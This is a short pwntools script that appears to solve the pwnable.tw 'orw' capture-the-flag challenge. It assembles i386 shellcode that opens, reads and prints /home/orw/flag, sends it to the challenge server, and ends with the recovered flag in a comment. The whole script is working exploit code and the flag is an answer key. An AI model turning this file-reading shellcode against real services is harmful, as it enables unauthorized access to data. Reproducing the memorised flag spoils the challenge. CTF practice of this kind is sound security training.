from pwn import *


shellcode = shellcraft.i386.pushstr("/home/orw/flag")
shellcode += shellcraft.i386.linux.open(file='esp', oflag=0, mode='O_RDONLY')
shellcode += shellcraft.i386.linux.read(fd="eax", buf="ebx", nbytes=64)
shellcode += shellcraft.i386.linux.write(fd=1, buf="esp", n=64)

sh = remote("chall.pwnable.tw", 10001)
sh.recvuntil(":")
sh.sendline(asm(shellcode))
print(sh.recvline())

# FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}
